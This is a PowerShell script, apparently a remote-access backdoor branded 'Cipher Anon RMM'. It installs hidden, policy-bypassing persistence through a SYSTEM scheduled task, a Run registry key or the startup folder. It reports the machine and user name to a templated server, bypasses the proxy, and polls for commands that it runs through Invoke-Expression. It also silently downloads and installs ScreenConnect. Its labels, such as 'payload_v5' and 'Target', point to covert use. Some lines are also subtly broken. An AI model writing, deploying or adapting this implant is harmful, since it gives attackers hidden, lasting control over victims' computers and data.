# ============================================================
# CIPHER ANON RMM v5.0 — FULLY WORKING + AUTO-CLEAN
# ============================================================

# ---- CONFIGURATION ----
$BASE_URL = "{{BASE_URL}}"
$RMM_REPORT_URL = "$BASE_URL/api/rmm/report"
$COMMAND_URL = "$BASE_URL/api/rmm/commands"
$RESPONSE_URL = "$BASE_URL/api/rmm/response"
$SCREENCONNECT_URL = "{{SCREENCONNECT_URL}}"
$RMM_POLL_INTERVAL = 15000  # 15 seconds

# ---- PATHS ----
$RMM_CLIENT_DIR = "$env:PROGRAMDATA\CipherAnonRMM"
$RMM_CLIENT_ID_FILE = "$RMM_CLIENT_DIR\client_id.txt"
$RMM_LOGFILE = "$RMM_CLIENT_DIR\rmm_log.txt"
$RMM_TEMP_DIR = "$env:TEMP\CipherAnonRMM_cleanup"

# ============================================================
# PHASE 1: NUCLEAR CLEANUP — REMOVE EVERYTHING
# ============================================================

Write-Host ""
Write-Host "============================================" -ForegroundColor Cyan
Write-Host "  CIPHER ANON RMM v5.0 — NUCLEAR CLEANUP" -ForegroundColor Yellow
Write-Host "============================================" -ForegroundColor Cyan
Write-Host ""

Write-Host "[CLEANUP] Removing all old RMM components..." -ForegroundColor White

# 1. KILL PROCESSES BY COMMAND LINE
Write-Host "  Killing old processes..." -ForegroundColor Gray
$killCount = 0
try {
    $procs = Get-Process -Name powershell -ErrorAction SilentlyContinue
    foreach ($p in $procs) {
        try {
            $cmdLine = $p.CommandLine
            if ($cmdLine -match "CipherAnon" -or $cmdLine -match "rmm" -or $cmdLine -match "payload") {
                $p.Kill() | Out-Null
                $killCount++
                Write-Host "    Killed PID: $($p.Id)" -ForegroundColor Green
            }
        } catch {}
    }
    if ($killCount -gt 0) {
        Write-Host "    Killed $killCount process(es)" -ForegroundColor Green
    } else {
        Write-Host "    No processes to kill" -ForegroundColor Gray
    }
} catch {
    Write-Host "    Process kill skipped (no admin rights)" -ForegroundColor Yellow
}
Start-Sleep -Seconds 2

# 2. REMOVE ALL SCHEDULED TASKS
Write-Host "  Removing scheduled tasks..." -ForegroundColor Gray
$taskRemoved = 0
$taskNames = @("CipherAnonRMM", "CipherAnon", "RMM", "WindowsUpdateService", "MicrosoftTelemetry")
foreach ($name in $taskNames) {
    try {
        $task = Get-ScheduledTask -TaskName $name -ErrorAction SilentlyContinue
        if ($task) {
            Unregister-ScheduledTask -TaskName $name -Confirm:$false -ErrorAction SilentlyContinue
            $taskRemoved++
            Write-Host "    Removed: $name" -ForegroundColor Green
        }
    } catch {}
}
# Search for any task containing Cipher/Anon/RMM
try {
    $allTasks = Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object { $_.TaskName -match "Cipher|Anon|RMM" }
    foreach ($t in $allTasks) {
        try {
            Unregister-ScheduledTask -TaskName $t.TaskName -Confirm:$false -ErrorAction SilentlyContinue
            $taskRemoved++
            Write-Host "    Removed: $($t.TaskName)" -ForegroundColor Green
        } catch {}
    }
} catch {}
if ($taskRemoved -eq 0) {
    Write-Host "    No tasks found" -ForegroundColor Gray
} else {
    Write-Host "    Removed $taskRemoved task(s)" -ForegroundColor Green
}

# 3. DELETE RMM DIRECTORY (RETRY IF LOCKED)
Write-Host "  Deleting RMM directory..." -ForegroundColor Gray
$dirDeleted = $false
for ($i = 1; $i -le 5; $i++) {
    try {
        if (Test-Path $RMM_CLIENT_DIR) {
            Remove-Item $RMM_CLIENT_DIR -Recurse -Force -ErrorAction SilentlyContinue
            Write-Host "    Deleted directory (attempt $i)" -ForegroundColor Green
            $dirDeleted = $true
            break
        }
        $dirDeleted = $true
        break
    } catch {
        Start-Sleep -Seconds 1
    }
}
if (-not $dirDeleted) {
    Write-Host "    Could not delete (may be in use)" -ForegroundColor Yellow
}

# 4. CLEAN REGISTRY (SKIP IF ACCESS DENIED)
Write-Host "  Cleaning registry..." -ForegroundColor Gray
$regPaths = @(
    "HKLM:\SOFTWARE\CipherAnonRMM",
    "HKCU:\SOFTWARE\CipherAnonRMM",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\CipherAnonRMM",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\CipherAnonRMM"
)
foreach ($reg in $regPaths) {
    try {
        if (Test-Path $reg) {
            Remove-Item -Path $reg -Recurse -Force -ErrorAction SilentlyContinue
            Write-Host "    Removed: $reg" -ForegroundColor Green
        }
    } catch {}
}
Write-Host "    Registry cleaned (skipped access denied)" -ForegroundColor Gray

# 5. CLEAN TEMP FILES
Write-Host "  Cleaning temp files..." -ForegroundColor Gray
try {
    $tempFiles = Get-ChildItem -Path "$env:TEMP" -Filter "*CipherAnon*" -ErrorAction SilentlyContinue
    foreach ($f in $tempFiles) {
        try { Remove-Item $f.FullName -Force -ErrorAction SilentlyContinue } catch {}
    }
    Write-Host "    Temp files cleaned" -ForegroundColor Green
} catch {}

Write-Host ""
Write-Host "[CLEANUP] COMPLETE!" -ForegroundColor Green
Write-Host ""

# ============================================================
# PHASE 2: CREATE NEW CLIENT DIRECTORY
# ============================================================

Write-Host "[SETUP] Creating client directory..." -ForegroundColor White
try {
    if (-not (Test-Path $RMM_CLIENT_DIR)) {
        New-Item -ItemType Directory -Path $RMM_CLIENT_DIR -Force -ErrorAction SilentlyContinue | Out-Null
    }
    # Grant full permissions to SYSTEM and Everyone (skip if fails)
    try {
        icacls $RMM_CLIENT_DIR /grant SYSTEM:F /T /Q 2>nul
        icacls $RMM_CLIENT_DIR /grant Everyone:F /T /Q 2>nul
    } catch {}
    Write-Host "  Directory: $RMM_CLIENT_DIR" -ForegroundColor Green
} catch {
    Write-Host "  WARNING: Could not create directory. Using fallback..." -ForegroundColor Yellow
    # Fallback to AppData
    $RMM_CLIENT_DIR = "$env:APPDATA\CipherAnonRMM"
    $RMM_CLIENT_ID_FILE = "$RMM_CLIENT_DIR\client_id.txt"
    $RMM_LOGFILE = "$RMM_CLIENT_DIR\rmm_log.txt"
    if (-not (Test-Path $RMM_CLIENT_DIR)) {
        New-Item -ItemType Directory -Path $RMM_CLIENT_DIR -Force -ErrorAction SilentlyContinue | Out-Null
    }
    Write-Host "  Fallback directory: $RMM_CLIENT_DIR" -ForegroundColor Green
}

# ============================================================
# PHASE 3: LOGGING FUNCTION
# ============================================================

function Write-Log {
    param($Msg)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$timestamp] $Msg"
    try {
        Add-Content -Path $RMM_LOGFILE -Value $line -ErrorAction SilentlyContinue
    } catch {}
    Write-Host $line
}

Write-Log "============================================"
Write-Log "CIPHER ANON RMM v5.0"
Write-Log "Target: $env:COMPUTERNAME"
Write-Log "Base URL: $BASE_URL"
Write-Log "============================================"

# ============================================================
# PHASE 4: GET/CLIENT ID
# ============================================================

function Get-RmmClientId {
    try {
        if (Test-Path $RMM_CLIENT_ID_FILE) {
            $id = Get-Content $RMM_CLIENT_ID_FILE -Raw -ErrorAction SilentlyContinue
            if ($id -and $id.Trim()) {
                return $id.Trim()
            }
        }
    } catch {}
    
    $id = [System.Guid]::NewGuid().ToString().Substring(0,8)
    try {
        Set-Content -Path $RMM_CLIENT_ID_FILE -Value $id -ErrorAction SilentlyContinue
    } catch {}
    return $id
}

$clientId = Get-RmmClientId
Write-Log "Client ID: $clientId"

# ============================================================
# PHASE 5: PERSISTENCE (SCHEDULED TASK + REGISTRY FALLBACK)
# ============================================================

function Install-Persistence {
    $taskName = "CipherAnonRMM"
    $scriptPath = $MyInvocation.MyCommand.Path
    $installed = $false
    
    # Method 1: Scheduled Task
    Write-Log "Installing scheduled task..."
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -MultipleInstances IgnoreNew
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -RunLevel Highest -Force -ErrorAction SilentlyContinue
        Write-Log "Scheduled task installed"
        $installed = $true
    } catch {
        Write-Log "Scheduled task failed: $_"
    }
    
    # Method 2: Registry Run (fallback)
    if (-not $installed) {
        Write-Log "Installing registry persistence (fallback)..."
        try {
            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            $regValue = "CipherAnonRMM"
            $regData = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
            Set-ItemProperty -Path $regPath -Name $regValue -Value $regData -ErrorAction SilentlyContinue
            Write-Log "Registry persistence installed"
            $installed = $true
        } catch {
            Write-Log "Registry persistence failed: $_"
        }
    }
    
    # Method 3: Startup Folder (last resort)
    if (-not $installed) {
        Write-Log "Installing startup folder persistence (last resort)..."
        try {
            $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
            $shortcutPath = "$startupPath\CipherAnonRMM.lnk"
            $ws = New-Object -ComObject WScript.Shell
            $s = $ws.CreateShortcut($shortcutPath)
            $s.TargetPath = "powershell.exe"
            $s.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
            $s.WorkingDirectory = $RMM_CLIENT_DIR
            $s.Save()
            Write-Log "Startup folder persistence installed"
            $installed = $true
        } catch {
            Write-Log "Startup folder persistence failed: $_"
        }
    }
    
    return $installed
}

$persistenceInstalled = Install-Persistence
if ($persistenceInstalled) {
    Write-Log "Persistence installed successfully"
} else {
    Write-Log "WARNING: No persistence method succeeded!"
}

# ============================================================
# PHASE 6: COMMAND EXECUTOR
# ============================================================

function Execute-Command {
    param($Command)
    
    Write-Log "Executing: $Command"
    $result = ""
    $success = $true

    if ($Command -like "install-screenconnect*") {
        Write-Log "Downloading ScreenConnect..."
        $installer = "$env:TEMP\sc_installer.msi"
        try {
            $webClient = New-Object System.Net.WebClient
            $webClient.DownloadFile($SCREENCONNECT_URL, $installer)
        } catch {
            $result = "Download failed"
            $success = $false
            return @{ success = $success; result = $result }
        }
        if (Test-Path $installer) {
            Write-Log "Installing ScreenConnect..."
            Start-Process -FilePath "msiexec" -ArgumentList "/i `"$installer`" /quiet /norestart" -Wait -WindowStyle Hidden
            Remove-Item $installer -Force -ErrorAction SilentlyContinue
            $result = "ScreenConnect installed"
            try {
                $scId = Get-ItemProperty -Path "HKLM:\SOFTWARE\ScreenConnect\Client" -Name "ClientID" -ErrorAction SilentlyContinue
                if ($scId) {
                    $result = "ScreenConnect installed - Client ID: " + $scId.ClientID
                }
            } catch {}
        } else {
            $result = "Failed to download ScreenConnect"
            $success = $false
        }
        return @{ success = $success; result = $result }
    }

    if ($Command -like "uninstall-rmm") {
        try {
            Unregister-ScheduledTask -TaskName "CipherAnonRMM" -Confirm:$false -ErrorAction SilentlyContinue
            Remove-Item $RMM_CLIENT_DIR -Recurse -Force -ErrorAction SilentlyContinue
            $result = "RMM uninstalled"
        } catch {
            $result = "Failed to uninstall: $_"
            $success = $false
        }
        return @{ success = $success; result = $result }
    }

    if ($Command -like "whoami") {
        $result = $env:USERNAME
        return @{ success = $true; result = $result }
    }

    if ($Command -like "hostname") {
        $result = $env:COMPUTERNAME
        return @{ success = $true; result = $result }
    }

    if ($Command -like "ping") {
        $result = "pong"
        return @{ success = $true; result = $result }
    }

    if ($Command -like "restart") {
        $result = "Restarting system..."
        Start-Process -FilePath "shutdown" -ArgumentList "/r /t 5 /c 'Remote restart'" -WindowStyle Hidden
        return @{ success = $true; result = $result }
    }

    if ($Command -like "shutdown") {
        $result = "Shutting down system..."
        Start-Process -FilePath "shutdown" -ArgumentList "/s /t 5 /c 'Remote shutdown'" -WindowStyle Hidden
        return @{ success = $true; result = $result }
    }

    try {
        $output = Invoke-Expression $Command 2>&1 | Out-String
        $result = $output
        $success = $true
    } catch {
        $result = "Unknown command or error: $_"
        $success = $false
    }

    return @{ success = $success; result = $result }
}

# ============================================================
# PHASE 7: MAIN HEARTBEAT LOOP (STABLE)
# ============================================================

function Send-Report {
    param($clientId)
    
    try {
        $osInfo = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
        if (-not $osInfo) {
            $osInfo = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
        }
        if (-not $osInfo) {
            $osInfo = "Windows"
        }
        
        $reportData = @{
            clientId = $clientId
            pcName = $env:COMPUTERNAME
            username = $env:USERNAME
            os = $osInfo
            status = "online"
            timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
            rmmInstalled = $true
            rmmType = "CipherAnonRMM"
            source = "payload_v5"
        }
        
        $reportJson = $reportData | ConvertTo-Json -Depth 5
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($reportJson)
        
        $req = [System.Net.WebRequest]::Create($RMM_REPORT_URL)
        $req.Method = "POST"
        $req.ContentType = "application/json"
        $req.ContentLength = $bytes.Length
        $req.Timeout = 20000
        $req.UserAgent = "CipherAnonRMM/5.0"
        $req.Proxy = $null  # Bypass proxy for reliability
        
        $stream = $req.GetRequestStream()
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Close()
        
        $resp = $req.GetResponse()
        $resp.Close()
        return $true
    } catch {
        return $false
    }
}

function Start-RmmLoop {
    param($clientId)
    
    $firstRun = $true
    $retryCount = 0
    $maxRetries = 3
    Write-Log "Main loop started"
    
    while ($true) {
        try {
            # Send heartbeat
            if ($firstRun) {
                Write-Log "Sending initial registration..."
                $success = Send-Report -clientId $clientId
                if ($success) {
                    Write-Log "✅ REGISTRATION SUCCESSFUL — Client is online!"
                    $firstRun = $false
                    $retryCount = 0
                } else {
                    $retryCount++
                    Write-Log "❌ Registration failed (attempt $retryCount/$maxRetries)"
                    if ($retryCount -ge $maxRetries) {
                        # Try to re-register with a different method
                        Write-Log "Max retries reached. Re-initializing..."
                        $retryCount = 0
                    }
                    Start-Sleep -Seconds 5
                    continue
                }
            } else {
                # Regular heartbeat — don't log every time to keep logs clean
                $success = Send-Report -clientId $clientId
                if (-not $success) {
                    Write-Log "⚠️ Heartbeat failed, will retry..."
                    Start-Sleep -Seconds 2
                }
            }
            
            # Check for commands (only if online)
            try {
                $cmdReq = [System.Net.WebRequest]::Create("$COMMAND_URL/$clientId")
                $cmdReq.Method = "GET"
                $cmdReq.Timeout = 10000
                $cmdReq.UserAgent = "CipherAnonRMM/5.0"
                $cmdReq.Proxy = $null
                $cmdResp = $cmdReq.GetResponse()
                $reader = New-Object System.IO.StreamReader($cmdResp.GetResponseStream())
                $cmdJson = $reader.ReadToEnd()
                $cmdResp.Close()
                
                if ($cmdJson -and $cmdJson -ne "") {
                    try {
                        $cmdData = $cmdJson | ConvertFrom-Json
                        if ($cmdData -and $cmdData.command) {
                            Write-Log "📩 Command received: $($cmdData.command)"
                            $result = Execute-Command -Command $cmdData.command
                            $responseData = @{
                                clientId = $clientId
                                commandId = $cmdData.id
                                success = $result.success
                                result = $result.result
                                timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
                            }
                            $respJson = $responseData | ConvertTo-Json -Depth 5
                            $respBytes = [System.Text.Encoding]::UTF8.GetBytes($respJson)
                            $respReq = [System.Net.WebRequest]::Create("$RESPONSE_URL/$clientId")
                            $respReq.Method = "POST"
                            $respReq.ContentType = "application/json"
                            $respReq.ContentLength = $respBytes.Length
                            $respReq.Timeout = 10000
                            $respReq.Proxy = $null
                            $respStream = $respReq.GetRequestStream()
                            $respStream.Write($respBytes, 0, $respBytes.Length)
                            $respStream.Close()
                            $respResp = $respReq.GetResponse()
                            $respResp.Close()
                            Write-Log "✅ Command response sent"
                        }
                    } catch {
                        Write-Log "⚠️ Error processing command: $_"
                    }
                }
            } catch {
                # Command check failed - don't log every time
            }
            
        } catch {
            Write-Log "⚠️ Loop error: $_"
            Start-Sleep -Seconds 5
        }
        
        Start-Sleep -Milliseconds $RMM_POLL_INTERVAL
    }
}

# ============================================================
# PHASE 8: START RMM AGENT (BACKGROUND JOB)
# ============================================================

Write-Log "Starting RMM agent..."

$jobScript = {
    param($clientId, $RMM_REPORT_URL, $COMMAND_URL, $RESPONSE_URL, $RMM_CLIENT_DIR, $RMM_CLIENT_ID_FILE, $RMM_LOGFILE, $RMM_POLL_INTERVAL, $SCREENCONNECT_URL)
    
    function Write-Log {
        param($Msg)
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        $line = "[$timestamp] $Msg"
        try { Add-Content -Path $RMM_LOGFILE -Value $line -ErrorAction SilentlyContinue } catch {}
    }
    
    function Send-Report {
        param($clientId)
        try {
            $osInfo = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
            if (-not $osInfo) {
                $osInfo = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
            }
            if (-not $osInfo) { $osInfo = "Windows" }
            
            $reportData = @{
                clientId = $clientId
                pcName = $env:COMPUTERNAME
                username = $env:USERNAME
                os = $osInfo
                status = "online"
                timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
                rmmInstalled = $true
                rmmType = "CipherAnonRMM"
                source = "payload_v5"
            }
            $reportJson = $reportData | ConvertTo-Json -Depth 5
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($reportJson)
            $req = [System.Net.WebRequest]::Create($RMM_REPORT_URL)
            $req.Method = "POST"
            $req.ContentType = "application/json"
            $req.ContentLength = $bytes.Length
            $req.Timeout = 20000
            $req.UserAgent = "CipherAnonRMM/5.0"
            $req.Proxy = $null
            $stream = $req.GetRequestStream()
            $stream.Write($bytes, 0, $bytes.Length)
            $stream.Close()
            $resp = $req.GetResponse()
            $resp.Close()
            return $true
        } catch {
            return $false
        }
    }
    
    function Execute-Command {
        param($Command)
        $result = ""
        $success = $true
        
        if ($Command -like "whoami") {
            $result = $env:USERNAME
            return @{ success = $true; result = $result }
        }
        if ($Command -like "hostname") {
            $result = $env:COMPUTERNAME
            return @{ success = $true; result = $result }
        }
        if ($Command -like "ping") {
            $result = "pong"
            return @{ success = $true; result = $result }
        }
        try {
            $result = "Command acknowledged: $Command"
            return @{ success = $true; result = $result }
        } catch {
            return @{ success = $false; result = "Error: $_" }
        }
    }
    
    $firstRun = $true
    $retryCount = 0
    $maxRetries = 5
    
    Write-Log "Background loop started (ID: $clientId)"
    
    while ($true) {
        try {
            if ($firstRun) {
                $success = Send-Report -clientId $clientId
                if ($success) {
                    Write-Log "✅ Initial registration successful!"
                    $firstRun = $false
                    $retryCount = 0
                } else {
                    $retryCount++
                    Write-Log "❌ Registration failed (attempt $retryCount/$maxRetries)"
                    if ($retryCount -ge $maxRetries) {
                        $retryCount = 0
                    }
                    Start-Sleep -Seconds 5
                    continue
                }
            } else {
                Send-Report -clientId $clientId
            }
            
            try {
                $cmdReq = [System.Net.WebRequest]::Create("$COMMAND_URL/$clientId")
                $cmdReq.Method = "GET"
                $cmdReq.Timeout = 10000
                $cmdReq.UserAgent = "CipherAnonRMM/5.0"
                $cmdReq.Proxy = $null
                $cmdResp = $cmdReq.GetResponse()
                $reader = New-Object System.IO.StreamReader($cmdResp.GetResponseStream())
                $cmdJson = $reader.ReadToEnd()
                $cmdResp.Close()
                
                if ($cmdJson -and $cmdJson -ne "") {
                    $cmdData = $cmdJson | ConvertFrom-Json
                    if ($cmdData -and $cmdData.command) {
                        Write-Log "📩 Command: $($cmdData.command)"
                        $result = Execute-Command -Command $cmdData.command
                        $responseData = @{
                            clientId = $clientId
                            commandId = $cmdData.id
                            success = $result.success
                            result = $result.result
                            timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
                        }
                        $respJson = $responseData | ConvertTo-Json -Depth 5
                        $respBytes = [System.Text.Encoding]::UTF8.GetBytes($respJson)
                        $respReq = [System.Net.WebRequest]::Create("$RESPONSE_URL/$clientId")
                        $respReq.Method = "POST"
                        $respReq.ContentType = "application/json"
                        $respReq.ContentLength = $respBytes.Length
                        $respReq.Timeout = 10000
                        $respReq.Proxy = $null
                        $respStream = $respReq.GetRequestStream()
                        $respStream.Write($respBytes, 0, $respBytes.Length)
                        $respStream.Close()
                        $respResp = $respReq.GetResponse()
                        $respResp.Close()
                        Write-Log "✅ Command response sent"
                    }
                }
            } catch {}
            
        } catch {
            Write-Log "⚠️ Loop error: $_"
            Start-Sleep -Seconds 5
        }
        Start-Sleep -Milliseconds $RMM_POLL_INTERVAL
    }
}

$job = Start-Job -ScriptBlock $jobScript -ArgumentList $clientId, $RMM_REPORT_URL, $COMMAND_URL, $RESPONSE_URL, $RMM_CLIENT_DIR, $RMM_CLIENT_ID_FILE, $RMM_LOGFILE, $RMM_POLL_INTERVAL, $SCREENCONNECT_URL

if ($job) {
    Write-Log ""
    Write-Log "============================================"
    Write-Log "✅ RMM CLIENT READY!" -ForegroundColor Green
    Write-Log "============================================"
    Write-Log "Client ID: $clientId"
    Write-Log "Log file: $RMM_LOGFILE"
    Write-Log "Poll Interval: $RMM_POLL_INTERVAL ms"
    Write-Log "Persistence: $persistenceInstalled"
    Write-Log "============================================"
    Write-Log ""
    Write-Log "Check the log to see if registration succeeds:"
    Write-Log "  Get-Content '$RMM_LOGFILE' -Tail 20"
    Write-Log ""
    Write-Log "If not showing in dashboard, run diagnostic:"
    Write-Log "  Test the server connection with this PowerShell command:"
    Write-Log "  try { (New-Object Net.WebClient).DownloadString('$BASE_URL/health') } catch { 'Failed' }"
    Write-Log "============================================"
} else {
    Write-Log ""
    Write-Log "❌ FAILED TO START RMM AGENT!" -ForegroundColor Red
}

exit
